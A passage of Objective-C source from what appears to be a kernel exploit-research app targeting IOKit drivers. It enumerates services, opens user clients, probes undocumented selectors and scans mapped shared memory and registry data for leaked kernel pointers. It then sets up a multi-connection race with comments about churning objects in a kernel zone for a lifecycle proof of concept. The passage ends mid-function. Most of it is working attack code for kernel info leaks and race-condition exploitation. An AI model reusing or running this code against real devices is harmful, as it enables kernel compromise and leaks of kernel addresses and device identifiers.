    static const uint32_t kServiceCap = 200;
    CFMutableDictionaryRef matching = sIOServiceMatching("IOService");
    if (!matching) {
        [self appendLog:@"SKIP: IOServiceMatching(\"IOService\") failed."];
        [self appendLog:@"====== Phase 4 Complete ======"];
        return;
    }

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        [self appendLog:[NSString stringWithFormat:@"SKIP: IOServiceGetMatchingServices failed: 0x%x (%s)", kr, mach_error_string(kr)]];
        [self appendLog:@"====== Phase 4 Complete ======"];
        return;
    }

    uint32_t processed = 0;
    uint32_t opened = 0;
    uint32_t refused = 0;
    uint32_t nonHIDOpen = 0;
    NSMutableArray<NSString *> *openedLabels = [NSMutableArray array];
    NSMutableArray<NSString *> *refusedLabels = [NSMutableArray array];

    io_service_t service = MACH_PORT_NULL;
    while (processed < kServiceCap && (service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        processed++;

        NSString *serviceClass = nil;
        NSString *serviceName = nil;
        uint64_t entryID = 0;
        NSString *label = [self labelForService:service outClass:&serviceClass outName:&serviceName outEntryID:&entryID];

        io_connect_t conn = MACH_PORT_NULL;
        kern_return_t kr2 = sIOServiceOpen(service, mach_task_self_, 2, &conn);
        kern_return_t openKr = kr2;
        uint32_t usedType = 2;
        kern_return_t kr0 = KERN_SUCCESS;
        kern_return_t kr1 = KERN_SUCCESS;

        if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
            kr0 = sIOServiceOpen(service, mach_task_self_, 0, &conn);
            openKr = kr0;
            usedType = 0;
        }
        if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
            kr1 = sIOServiceOpen(service, mach_task_self_, 1, &conn);
            openKr = kr1;
            usedType = 1;
        }

        if (openKr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
            opened++;
            BOOL isHID = ([serviceClass rangeOfString:@"HID" options:NSCaseInsensitiveSearch].location != NSNotFound
                          || [serviceName rangeOfString:@"HID" options:NSCaseInsensitiveSearch].location != NSNotFound);
            if (!isHID) nonHIDOpen++;

            NSString *openLabel = [NSString stringWithFormat:@"open(type=%u) SUCCESS %@", usedType, label];
            [openedLabels addObject:openLabel];
            [self appendLog:[NSString stringWithFormat:@"[%u/%u] %@", processed, kServiceCap, openLabel]];
            if (!isHID) {
                [self appendLog:@"  NOTABLE: non-HID service accepted user-client open."];
            }

            uint64_t scalarIn = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t gateKr = sIOConnectCallMethod(
                conn, kSelectorOpen,
                &scalarIn, 1,
                xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL
            );
            [self appendLog:[NSString stringWithFormat:@"  selector0(XML) => 0x%x (%s)", gateKr, mach_error_string(gateKr)]];
            if (gateKr == KERN_SUCCESS) {
                uint64_t closeScalar = 0;
                kern_return_t selCloseKr = sIOConnectCallMethod(conn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
                [self appendLog:[NSString stringWithFormat:@"  selector1(close) => 0x%x (%s)", selCloseKr, mach_error_string(selCloseKr)]];
            }
            sIOServiceClose(conn);
        } else {
            refused++;
            NSString *refuseLabel = [NSString stringWithFormat:@"refused %@ | type2=0x%x type0=0x%x type1=0x%x",
                                     label, kr2, kr0, kr1];
            [refusedLabels addObject:refuseLabel];
            [self appendLog:[NSString stringWithFormat:@"[%u/%u] %@", processed, kServiceCap, refuseLabel]];
        }

        sIOObjectRelease(service);
    }

    BOOL truncated = NO;
    if (processed >= kServiceCap) {
        io_service_t extra = sIOIteratorNext(iter);
        if (extra != MACH_PORT_NULL) {
            truncated = YES;
            sIOObjectRelease(extra);
        }
    }
    sIOObjectRelease(iter);

    [self appendLog:@"--- Phase 4 Summary ---"];
    [self appendLog:[NSString stringWithFormat:@"processed=%u (cap=%u) opened=%u refused=%u nonHIDOpened=%u",
                     processed, kServiceCap, opened, refused, nonHIDOpen]];
    [self appendLog:[NSString stringWithFormat:@"group.opened=%@", openedLabels.count ? @"YES" : @"NO"]];
    for (NSString *line in openedLabels) {
        [self appendLog:[NSString stringWithFormat:@"  OPENED: %@", line]];
    }
    [self appendLog:[NSString stringWithFormat:@"group.refused=%@", refusedLabels.count ? @"YES" : @"NO"]];
    uint32_t refusedPreview = (uint32_t)MIN((NSUInteger)20, refusedLabels.count);
    for (uint32_t i = 0; i < refusedPreview; i++) {
        [self appendLog:[NSString stringWithFormat:@"  REFUSED[%u]: %@", i, refusedLabels[i]]];
    }
    if (refusedLabels.count > refusedPreview) {
        [self appendLog:[NSString stringWithFormat:@"  ... %lu additional refused entries omitted",
                         (unsigned long)(refusedLabels.count - refusedPreview)]];
    }
    if (truncated) {
        [self appendLog:@"NOTE: enumeration truncated at 200 services (more services were present)."];
    }

    [self appendLog:@"====== Phase 4 Complete ======"];
}

#pragma mark - Phase 5: Mapped Memory Bounds Audit

- (double)shannonEntropyForBytes:(const uint8_t *)bytes length:(size_t)length {
    if (!bytes || length == 0) return 0.0;
    uint32_t freq[256] = {0};
    for (size_t i = 0; i < length; i++) {
        freq[bytes[i]]++;
    }
    double entropy = 0.0;
    const double invLen = 1.0 / (double)length;
    for (int i = 0; i < 256; i++) {
        if (freq[i] == 0) continue;
        double p = (double)freq[i] * invLen;
        entropy -= p * log2(p);
    }
    return entropy;
}

- (void)runPhase5MappedMemoryBoundsAudit:(io_connect_t)connection
                              mappedAddr:(mach_vm_address_t)mappedAddr
                              mappedSize:(mach_vm_size_t)mappedSize {
    [self appendLog:@"\n====== Phase 5: Mapped Memory Bounds Audit ======"];

    if (connection == MACH_PORT_NULL || !sIOConnectCallMethod) {
        [self appendLog:@"SKIP: no active connection for bounds audit."];
        [self appendLog:@"====== Phase 5 Complete ======"];
        return;
    }

    BOOL mappedLocally = NO;
    mach_vm_address_t localAddr = mappedAddr;
    mach_vm_size_t localSize = mappedSize;
    if ((localAddr == 0 || localSize == 0) && sIOConnectMapMemory64) {
        kern_return_t mapKr = sIOConnectMapMemory64(connection, kMemoryTypeEventBuffer, mach_task_self(), &localAddr, &localSize, 1);
        [self appendLog:[NSString stringWithFormat:@"phase5 map(type=0): 0x%x (%s) addr=0x%llx size=%llu",
                         mapKr, mach_error_string(mapKr), localAddr, localSize]];
        mappedLocally = (mapKr == KERN_SUCCESS && localAddr != 0 && localSize > 0);
    }
    if (localAddr == 0 || localSize == 0) {
        [self appendLog:@"SKIP: no mapped event buffer available."];
        [self appendLog:@"====== Phase 5 Complete ======"];
        return;
    }

    NSData *prevTrailing = nil;
    for (uint32_t i = 0; i < 4; i++) {
        uint64_t scalarsIn[2] = {0, 1};
        uint8_t structOut[64];
        size_t structOutSize = sizeof(structOut);
        kern_return_t copyKr = sIOConnectCallMethod(
            connection, kSelectorCopyEvent,
            scalarsIn, 2,
            NULL, 0,
            NULL, NULL,
            structOut, &structOutSize
        );

        const uint8_t *base = (const uint8_t *)(uintptr_t)localAddr;
        size_t totalSize = (size_t)localSize;
        uint32_t eventSize = 0;
        if (totalSize >= 4) {
            memcpy(&eventSize, base, sizeof(eventSize));
        }
        size_t eventRegionBytes = totalSize;
        if (totalSize >= 4) {
            uint64_t needed = 4ull + (uint64_t)eventSize;
            eventRegionBytes = (needed <= totalSize) ? (size_t)needed : totalSize;
        }
        size_t trailingStart = eventRegionBytes;
        size_t trailingLen = (trailingStart <= totalSize) ? (totalSize - trailingStart) : 0;
        const uint8_t *trailing = base + trailingStart;

        size_t nonZero = 0;
        for (size_t j = 0; j < trailingLen; j++) {
            if (trailing[j] != 0) nonZero++;
        }
        double entropy = [self shannonEntropyForBytes:trailing length:trailingLen];

        BOOL changed = NO;
        if (prevTrailing) {
            if (prevTrailing.length != trailingLen) {
                changed = YES;
            } else if (trailingLen > 0 && memcmp(prevTrailing.bytes, trailing, trailingLen) != 0) {
                changed = YES;
            }
        }
        prevTrailing = (trailingLen > 0) ? [NSData dataWithBytes:trailing length:trailingLen] : [NSData data];

        [self appendLog:[NSString stringWithFormat:
                         @"audit[%u] copyEvent=0x%x totalMapped=%zu eventSize=%u trailing=%zu trailingNonZero=%zu entropy=%.4f trailingChanged=%@",
                         i, copyKr, totalSize, eventSize, trailingLen, nonZero, entropy, changed ? @"YES" : @"NO"]];

        if (nonZero > 0 && trailingLen > 0) {
            size_t dumpLen = MIN((size_t)64, trailingLen);
            [self appendLog:[NSString stringWithFormat:@"  trailingHex: %@",
                             [self hexPreview:trailing length:dumpLen]]];
        }
    }

    if (mappedLocally) {
        BOOL released = NO;
        if (sIOConnectUnmapMemory64) {
            kern_return_t unmapKr = sIOConnectUnmapMemory64(connection, kMemoryTypeEventBuffer, mach_task_self(), localAddr);
            [self appendLog:[NSString stringWithFormat:@"phase5 unmap(type=0): 0x%x (%s)", unmapKr, mach_error_string(unmapKr)]];
            released = (unmapKr == KERN_SUCCESS);
        }
        if (!released) {
            kern_return_t deallocKr = vm_deallocate(mach_task_self(), (vm_address_t)localAddr, (vm_size_t)localSize);
            [self appendLog:[NSString stringWithFormat:@"phase5 fallback vm_deallocate: 0x%x (%s)",
                             deallocKr, mach_error_string(deallocKr)]];
        }
    }

    [self appendLog:@"====== Phase 5 Complete ======"];
}

#pragma mark - Phase 6: Extended Selector Probing

- (void)runPhase6ExtendedSelectorProbing:(io_connect_t)connection {
    [self appendLog:@"\n====== Phase 6: Extended Selector Probing ======"];

    if (connection == MACH_PORT_NULL || !sIOConnectCallMethod) {
        [self appendLog:@"SKIP: no active connection for selector probing."];
        [self appendLog:@"====== Phase 6 Complete ======"];
        return;
    }

    for (uint32_t sel = 3; sel <= 15; sel++) {
        kern_return_t krMinimal = sIOConnectCallMethod(connection, sel, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        uint64_t scalarZero = 0;
        kern_return_t krScalar = sIOConnectCallMethod(connection, sel, &scalarZero, 1, NULL, 0, NULL, NULL, NULL, NULL);
        const char *xml = kOpenPropertiesXML;
        kern_return_t krStruct = sIOConnectCallMethod(connection, sel, NULL, 0, xml, strlen(xml) + 1, NULL, NULL, NULL, NULL);

        [self appendLog:[NSString stringWithFormat:
                         @"selector[%u] minimal=0x%x (%s) scalar0=0x%x (%s) structXML=0x%x (%s)",
                         sel,
                         krMinimal, mach_error_string(krMinimal),
                         krScalar, mach_error_string(krScalar),
                         krStruct, mach_error_string(krStruct)]];

        BOOL anySuccess = (krMinimal == KERN_SUCCESS || krScalar == KERN_SUCCESS || krStruct == KERN_SUCCESS);
        if (anySuccess && sIOConnectMapMemory64) {
            mach_vm_address_t mapAddr = 0;
            mach_vm_size_t mapSize = 0;
            kern_return_t mapKr = sIOConnectMapMemory64(connection, kMemoryTypeEventBuffer, mach_task_self(), &mapAddr, &mapSize, 1);
            [self appendLog:[NSString stringWithFormat:
                             @"  selector[%u] post-success map(type=0): 0x%x (%s) addr=0x%llx size=%llu",
                             sel, mapKr, mach_error_string(mapKr), mapAddr, mapSize]];
            if (mapKr == KERN_SUCCESS && mapAddr != 0 && mapSize > 0) {
                const uint8_t *buf = (const uint8_t *)(uintptr_t)mapAddr;
                size_t previewLen = MIN((size_t)32, (size_t)mapSize);
                [self appendLog:[NSString stringWithFormat:@"  selector[%u] map preview: %@",
                                 sel, [self hexPreview:buf length:previewLen]]];
                [self appendLog:[NSString stringWithFormat:@"  selector[%u] map header: %@",
                                 sel, [self eventHeaderSummary:buf length:(size_t)mapSize]]];

                BOOL unmapped = NO;
                if (sIOConnectUnmapMemory64) {
                    kern_return_t unmapKr = sIOConnectUnmapMemory64(connection, kMemoryTypeEventBuffer, mach_task_self(), mapAddr);
                    [self appendLog:[NSString stringWithFormat:@"  selector[%u] unmap(type=0): 0x%x (%s)",
                                     sel, unmapKr, mach_error_string(unmapKr)]];
                    unmapped = (unmapKr == KERN_SUCCESS);
                }
                if (!unmapped) {
                    kern_return_t deallocKr = vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
                    [self appendLog:[NSString stringWithFormat:@"  selector[%u] fallback vm_deallocate: 0x%x (%s)",
                                     sel, deallocKr, mach_error_string(deallocKr)]];
                }
            }
        }
    }

    [self appendLog:@"====== Phase 6 Complete ======"];
}

#pragma mark - Phase 7: Registry Property Traversal

- (NSString *)cfTypeName:(CFTypeRef)value {
    if (!value) return @"<null>";
    CFTypeID tid = CFGetTypeID(value);
    if (tid == CFStringGetTypeID()) return @"CFString";
    if (tid == CFNumberGetTypeID()) return @"CFNumber";
    if (tid == CFBooleanGetTypeID()) return @"CFBoolean";
    if (tid == CFDataGetTypeID()) return @"CFData";
    if (tid == CFArrayGetTypeID()) return @"CFArray";
    if (tid == CFDictionaryGetTypeID()) return @"CFDictionary";
    if (tid == CFSetGetTypeID()) return @"CFSet";
    return [NSString stringWithFormat:@"CFTypeID(%lu)", (unsigned long)tid];
}

- (void)runPhase7RegistryPropertyTraversal:(io_connect_t)connection {
    [self appendLog:@"\n====== Phase 7: Registry Property Traversal ======"];

    if (connection == MACH_PORT_NULL || !sIOConnectGetService || !sIORegistryEntryCreateCFProperties || !sIOObjectRelease) {
        [self appendLog:@"SKIP: required symbols unavailable for registry traversal."];
        [self appendLog:@"====== Phase 7 Complete ======"];
        return;
    }

    io_service_t service = MACH_PORT_NULL;
    kern_return_t getSvcKr = sIOConnectGetService(connection, &service);
    if (getSvcKr != KERN_SUCCESS || service == MACH_PORT_NULL) {
        [self appendLog:[NSString stringWithFormat:@"SKIP: IOConnectGetService failed: 0x%x (%s)",
                         getSvcKr, mach_error_string(getSvcKr)]];
        [self appendLog:@"====== Phase 7 Complete ======"];
        return;
    }

    NSString *serviceClass = nil;
    NSString *serviceName = nil;
    uint64_t entryID = 0;
    NSString *label = [self labelForService:service outClass:&serviceClass outName:&serviceName outEntryID:&entryID];
    [self appendLog:[NSString stringWithFormat:@"target service: %@", label]];

    CFMutableDictionaryRef props = NULL;
    kern_return_t propsKr = sIORegistryEntryCreateCFProperties(service, &props, kCFAllocatorDefault, 0);
    if (propsKr != KERN_SUCCESS || !props) {
        [self appendLog:[NSString stringWithFormat:@"IORegistryEntryCreateCFProperties failed: 0x%x (%s)",
                         propsKr, mach_error_string(propsKr)]];
        sIOObjectRelease(service);
        [self appendLog:@"====== Phase 7 Complete ======"];
        return;
    }

    CFIndex count = CFDictionaryGetCount(props);
    [self appendLog:[NSString stringWithFormat:@"propertyCount=%ld", (long)count]];
    if (count > 0) {
        const void **keys = (const void **)malloc((size_t)count * sizeof(void *));
        const void **vals = (const void **)malloc((size_t)count * sizeof(void *));
        if (keys && vals) {
            CFDictionaryGetKeysAndValues(props, keys, vals);
            uint32_t flagged = 0;
            for (CFIndex i = 0; i < count; i++) {
                CFTypeRef keyRef = (CFTypeRef)keys[i];
                CFTypeRef valRef = (CFTypeRef)vals[i];

                NSString *key = nil;
                if (keyRef && CFGetTypeID(keyRef) == CFStringGetTypeID()) {
                    key = [(__bridge NSString *)keyRef copy];
                } else {
                    key = [self compactCFValue:keyRef];
                }
                NSString *type = [self cfTypeName:valRef];
                NSString *summary = [self compactCFValue:valRef];
                if (summary.length > 180) {
                    summary = [[summary substringToIndex:180] stringByAppendingString:@"..."];
                }
                [self appendLog:[NSString stringWithFormat:@"  key[%ld] %@ type=%@ value=%@",
                                 (long)i, key, type, summary]];

                NSString *lk = key.lowercaseString ?: @"";
                NSString *ls = summary.lowercaseString ?: @"";
                NSMutableArray<NSString *> *reasons = [NSMutableArray array];

                if ([ls containsString:@"/"] || [lk containsString:@"path"]) {
                    [reasons addObject:@"file-path-like"];
                }
                if ([ls containsString:@"com."] || [lk containsString:@"bundle"]) {
                    [reasons addObject:@"bundle-id-like"];
                }
                if ([ls containsString:@"entitlement"] || [lk containsString:@"entitlement"]) {
                    [reasons addObject:@"entitlement-like"];
                }
                if ([ls containsString:@"0xffff"] || [ls containsString:@"0xffffff"]) {
                    [reasons addObject:@"kernel-address-like"];
                }
                if ([lk containsString:@"uuid"] || [lk containsString:@"udid"] || [lk containsString:@"serial"]
                    || [lk containsString:@"ecid"] || [lk containsString:@"imei"] || [lk containsString:@"chipid"]
                    || [lk containsString:@"unique"]) {
                    [reasons addObject:@"device-identifier-like"];
                }
                if (valRef && CFGetTypeID(valRef) == CFNumberGetTypeID()) {
                    uint64_t num = 0;
                    if (CFNumberGetValue((CFNumberRef)valRef, kCFNumberSInt64Type, &num)) {
                        if (num >= 0xFFFF000000000000ULL) {
                            [reasons addObject:@"numeric-kernel-pointer-like"];
                        }
                    }
                }

                if (reasons.count > 0) {
                    flagged++;
                    [self appendLog:[NSString stringWithFormat:@"    FLAG: %@",
                                     [reasons componentsJoinedByString:@", "]]];
                }
            }
            [self appendLog:[NSString stringWithFormat:@"flaggedProperties=%u", flagged]];
        } else {
            [self appendLog:@"property dump skipped: allocation failure"];
        }
        free((void *)keys);
        free((void *)vals);
    }

    CFRelease(props);
    sIOObjectRelease(service);
    [self appendLog:@"====== Phase 7 Complete ======"];
}

#pragma mark - Phase 8: Connection Port Analysis

- (void)runPhase8ConnectionPortAnalysis:(io_connect_t)connection {
    [self appendLog:@"\n====== Phase 8: Connection Port Analysis ======"];

    if (connection == MACH_PORT_NULL) {
        [self appendLog:@"SKIP: no connection port available."];
        [self appendLog:@"====== Phase 8 Complete ======"];
        return;
    }

    mach_port_context_t ctx = 0;
    kern_return_t ctxKr = mach_port_get_context(mach_task_self(), connection, &ctx);
    [self appendLog:[NSString stringWithFormat:@"mach_port_get_context: 0x%x (%s) context=0x%llx",
                     ctxKr, mach_error_string(ctxKr), (unsigned long long)ctx]];

    ipc_info_object_type_t objectType = 0;
    mach_vm_address_t objectAddr = 0;
    kobject_description_t description = {0};
    kern_return_t descKr = mach_port_kobject_description(
        mach_task_self(),
        connection,
        &objectType,
        &objectAddr,
        description
    );
    if (descKr == KERN_SUCCESS) {
        [self appendLog:[NSString stringWithFormat:
                         @"mach_port_kobject_description: SUCCESS type=%u addr=0x%llx desc=\"%s\"",
                         objectType, objectAddr, description]];
    } else {
        [self appendLog:[NSString stringWithFormat:
                         @"mach_port_kobject_description: 0x%x (%s)",
                         descKr, mach_error_string(descKr)]];
    }

    if (!sIOConnectMapMemory64) {
        [self appendLog:@"map(type=1..3): SKIP (IOConnectMapMemory64 unavailable)"];
        [self appendLog:@"====== Phase 8 Complete ======"];
        return;
    }

    for (uint32_t memType = 1; memType <= 3; memType++) {
        mach_vm_address_t mapAddr = 0;
        mach_vm_size_t mapSize = 0;
        kern_return_t mapKr = sIOConnectMapMemory64(connection, memType, mach_task_self(), &mapAddr, &mapSize, 1);
        [self appendLog:[NSString stringWithFormat:
                         @"map(memoryType=%u): 0x%x (%s) addr=0x%llx size=%llu",
                         memType, mapKr, mach_error_string(mapKr), mapAddr, mapSize]];

        if (mapKr != KERN_SUCCESS || mapAddr == 0 || mapSize == 0) {
            continue;
        }

        const uint8_t *buf = (const uint8_t *)(uintptr_t)mapAddr;
        size_t previewLen = MIN((size_t)32, (size_t)mapSize);
        size_t scanLen = MIN((size_t)256, (size_t)mapSize);
        size_t nonZero = 0;
        for (size_t i = 0; i < scanLen; i++) {
            if (buf[i] != 0) nonZero++;
        }
        [self appendLog:[NSString stringWithFormat:@"  preview=%@", [self hexPreview:buf length:previewLen]]];
        [self appendLog:[NSString stringWithFormat:@"  first%zu nonZero=%zu", scanLen, nonZero]];

        BOOL unmapped = NO;
        if (sIOConnectUnmapMemory64) {
            kern_return_t unmapKr = sIOConnectUnmapMemory64(connection, memType, mach_task_self(), mapAddr);
            [self appendLog:[NSString stringWithFormat:@"  unmap(memoryType=%u): 0x%x (%s)",
                             memType, unmapKr, mach_error_string(unmapKr)]];
            unmapped = (unmapKr == KERN_SUCCESS);
        }
        if (!unmapped) {
            kern_return_t deallocKr = vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
            [self appendLog:[NSString stringWithFormat:@"  fallback vm_deallocate(memoryType=%u): 0x%x (%s)",
                             memType, deallocKr, mach_error_string(deallocKr)]];
        }
    }

    [self appendLog:@"====== Phase 8 Complete ======"];
}

#pragma mark - Deep Probe Entry Point

- (void)deepProbeTapped {
    self.deepProbeButton.enabled = NO;

    [self appendLog:@"\n\n========== DEEP BOUNDARY PROBES =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols."];
        self.deepProbeButton.enabled = YES;
        return;
    }

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // Acquire a gateable connection by iterating instances with selector 0.
        io_connect_t mainConn = MACH_PORT_NULL;
        kern_return_t gateKr = [self probeOpenVariantXML:kOpenPropertiesXML
                                                   label:@"Deep probe gate candidate"
                                          keepConnection:YES
                                     runPreOpenCopyProbe:NO
                                           outPreCopyKr:NULL
                                     outPreCopyNonZero:NULL
                                          outConnection:&mainConn];
        [self appendLog:[NSString stringWithFormat:@"Main connection gate: 0x%x (%s)",
                         gateKr, mach_error_string(gateKr)]];
        if (gateKr == (kern_return_t)0xE00002C5) {
            [self appendLog:@"NOTE: Gate blocked by exclusive-access precondition on available instances."];
        }
        if (gateKr != KERN_SUCCESS || mainConn == MACH_PORT_NULL) {
            if (mainConn != MACH_PORT_NULL) {
                sIOServiceClose(mainConn);
            }
            dispatch_async(dispatch_get_main_queue(), ^{ self.deepProbeButton.enabled = YES; });
            return;
        }

        // Map shared memory
        mach_vm_address_t mappedAddr = 0;
        mach_vm_size_t mappedSize = 0;
        kern_return_t mapKr = KERN_FAILURE;
        BOOL haveMapped = NO;
        if (gateKr == KERN_SUCCESS && sIOConnectMapMemory64) {
            mapKr = sIOConnectMapMemory64(mainConn, kMemoryTypeEventBuffer,
                                           mach_task_self(), &mappedAddr, &mappedSize, 1);
            haveMapped = (mapKr == KERN_SUCCESS && mappedAddr != 0 && mappedSize > 0);
            [self appendLog:[NSString stringWithFormat:@"MapMemory: 0x%x mapped=%@ addr=0x%llx size=%llu",
                             mapKr, haveMapped ? @"YES" : @"NO", mappedAddr, mappedSize]];
        }

        // ---- Phase 1: Binary format probe (reuses this gated connection) ----
        [self runBinaryFormatProbe:mainConn];

        // ---- Phase 2: Concurrency stress test (uses main connection) ----
        BOOL phase2Clean = YES;
        if (gateKr == KERN_SUCCESS) {
            phase2Clean = [self runConcurrencyStressTest:mainConn];

            // Re-open the gate after concurrency test may have closed it
            uint64_t scalarIn = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t reopenKr = sIOConnectCallMethod(
                mainConn, kSelectorOpen,
                &scalarIn, 1,
                xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL
            );
            [self appendLog:[NSString stringWithFormat:@"Post-concurrency re-open: 0x%x (%s)",
                             reopenKr, mach_error_string(reopenKr)]];

            // Re-map if needed — unmap old mapping first to avoid leak.
            // If unmap symbol is missing, skip remap to avoid orphaning the old mapping.
            if (haveMapped && sIOConnectMapMemory64 && sIOConnectUnmapMemory64) {
                if (mappedAddr) {
                    sIOConnectUnmapMemory64(mainConn, kMemoryTypeEventBuffer, mach_task_self(), mappedAddr);
                }
                mach_vm_address_t newAddr = 0;
                mach_vm_size_t newSize = 0;
                kern_return_t remapKr = sIOConnectMapMemory64(mainConn, kMemoryTypeEventBuffer,
                                                               mach_task_self(), &newAddr, &newSize, 1);
                if (remapKr == KERN_SUCCESS && newAddr != 0 && newSize > 0) {
                    mappedAddr = newAddr;
                    mappedSize = newSize;
                } else {
                    // Old mapping was unmapped; mark as unavailable
                    mappedAddr = 0;
                    mappedSize = 0;
                    haveMapped = NO;
                }
            }
        } else {
            [self appendLog:@"\n====== Phase 2: SKIPPED (gate not open) ======"];
        }

        // ---- Phase 3: Event visibility probe (uses main connection + mapped buffer) ----
        if (gateKr == KERN_SUCCESS && phase2Clean) {
            [self runEventCapture:mainConn mappedAddr:mappedAddr mappedSize:mappedSize];
        } else if (!phase2Clean) {
            [self appendLog:@"\n====== Phase 3: SKIPPED (Phase 2 workers did not drain — connection state uncertain) ======"];
        } else {
            [self appendLog:@"\n====== Phase 3: SKIPPED (gate not open) ======"];
        }

        // ---- Phase 4: Broad IOKit service enumeration ----
        [self runPhase4BroadServiceEnumeration];

        // ---- Phase 5: Mapped memory bounds audit ----
        [self runPhase5MappedMemoryBoundsAudit:mainConn mappedAddr:mappedAddr mappedSize:mappedSize];

        // ---- Phase 6: Extended selector probing ----
        [self runPhase6ExtendedSelectorProbing:mainConn];

        // ---- Phase 7: Registry property traversal ----
        [self runPhase7RegistryPropertyTraversal:mainConn];

        // ---- Phase 8: Connection-port analysis ----
        [self runPhase8ConnectionPortAnalysis:mainConn];

        // ---- Cleanup ----
        [self appendLog:@"\n--- Deep Probe Cleanup ---"];
        if (haveMapped && mappedAddr) {
            kern_return_t cleanupUnmapKr = KERN_FAILURE;
            if (sIOConnectUnmapMemory64) {
                cleanupUnmapKr = sIOConnectUnmapMemory64(mainConn, kMemoryTypeEventBuffer, mach_task_self(), mappedAddr);
            }
            if (!sIOConnectUnmapMemory64 || cleanupUnmapKr != KERN_SUCCESS) {
                kern_return_t cleanupDeallocKr = vm_deallocate(mach_task_self(), (vm_address_t)mappedAddr, (vm_size_t)mappedSize);
                [self appendLog:[NSString stringWithFormat:@"Deep probe unmap/dealloc cleanup: unmap=0x%x dealloc=0x%x",
                                 cleanupUnmapKr, cleanupDeallocKr]];
            }
        }
        uint64_t closeScalar = 0;
        sIOConnectCallMethod(mainConn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
        sIOServiceClose(mainConn);

        [self appendLog:@"\n========== DEEP BOUNDARY PROBES COMPLETE =========="];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.deepProbeButton.enabled = YES;
        });
    });
}

#pragma mark - Lifecycle Boundary Test

- (void)lifecycleBoundaryTapped {
    self.lifecycleButton.enabled = NO;
    self.triggerButton.enabled = NO;
    self.deepProbeButton.enabled = NO;

    [self appendLog:@"\n\n========== OBJECT LIFECYCLE BOUNDARY TEST =========="];

    if (![self loadIOKitSymbols]) {
        [self appendLog:@"FAIL: could not load IOKit symbols."];
        self.lifecycleButton.enabled = YES;
        self.triggerButton.enabled = YES;
        self.deepProbeButton.enabled = YES;
        return;
    }

    [self clearLifecyclePocState];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // Open multiple connections to the SAME provider.
        // Each connection has its own per-userclient IOCommandGate, so close
        // on conn[0] and open on conn[1..N] enter the provider concurrently
        // unless the provider serializes internally (workloop, provider gate, etc.).
        // Target many connections for maximum ClientObject churn in the type-isolated zone.
        // Each gated connection creates a ClientObject (0x48 bytes) in the same zone.
        // Accept whatever the provider allows — even 4 is useful.
        //
        // Leave at least one spare slot for the termination-race thread, which needs
        // to open/close fresh userclients repeatedly. Some providers cap the number
        // of simultaneous userclients; if we consume the full cap here, IOServiceOpen
        // in the race thread may fail with kIOReturnUnsupported.
        enum { kDesiredConnections = 15 };
        io_connect_t conns[kDesiredConnections];
        io_service_t providerService = MACH_PORT_NULL;
        int connCount = [self openMultipleGatedConnections:conns
                                                  maxCount:kDesiredConnections
                                                outService:&providerService];

        if (connCount < 2) {
            [self appendLog:[NSString stringWithFormat:
                @"Need at least 2 connections for multi-gate lifecycle test, got %d. Falling back to single-connection mode.", connCount]];
            // Fall back: if we got 1, use it; if 0, bail
            if (connCount == 0) {
                [self appendLog:@"Cannot proceed — no connections established."];
                if (providerService != MACH_PORT_NULL) {
                    sIOObjectRelease(providerService);
                }
                dispatch_async(dispatch_get_main_queue(), ^{
                    self.lifecycleButton.enabled = YES;
                    self.triggerButton.enabled = YES;
                    self.deepProbeButton.enabled = YES;
                });
                return;
            }
        }

        [self appendLog:[NSString stringWithFormat:@"Established %d connections to same provider (separate per-userclient gates)", connCount]];

        // Map shared memory on the primary connection
        io_connect_t primaryConn = conns[0];
        mach_vm_address_t mappedAddr = 0;
        mach_vm_size_t mappedSize = 0;
        BOOL haveMapped = NO;
        if (sIOConnectMapMemory64) {
            kern_return_t mapKr = sIOConnectMapMemory64(primaryConn, kMemoryTypeEventBuffer,
                                                         mach_task_self(), &mappedAddr, &mappedSize, 1);
            haveMapped = (mapKr == KERN_SUCCESS && mappedAddr != 0 && mappedSize > 0);
            [self appendLog:[NSString stringWithFormat:@"MapMemory: 0x%x mapped=%@ addr=0x%llx size=%llu",
                             mapKr, haveMapped ? @"YES" : @"NO", mappedAddr, mappedSize]];
        }

        if (!haveMapped) {
                [self appendLog:@"Cannot proceed — shared buffer not mapped."];
            for (int i = 0; i < connCount; i++) {
                uint64_t closeScalar = 0;
                sIOConnectCallMethod(conns[i], kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
                sIOServiceClose(conns[i]);
            }
            if (providerService != MACH_PORT_NULL) {
                sIOObjectRelease(providerService);
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                self.lifecycleButton.enabled = YES;
                self.triggerButton.enabled = YES;
                self.deepProbeButton.enabled = YES;
            });
            return;
        }

        // ---- Sub-phase A: Mapped Buffer Baseline Scan ----
        [self runBaselineScan:primaryConn mappedAddr:mappedAddr mappedSize:mappedSize];

        // Capture pre-stress snapshot and entropy for sub-phases C and D
        size_t snapLen = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);
        NSData *preSnapshot = [NSData dataWithBytes:(const void *)(uintptr_t)mappedAddr length:snapLen];
        double preEntropy = [self shannonEntropyForBytes:(const uint8_t *)(uintptr_t)mappedAddr length:snapLen];
        uint64_t preHash = 0;
        {
            const uint8_t *p = (const uint8_t *)(uintptr_t)mappedAddr;
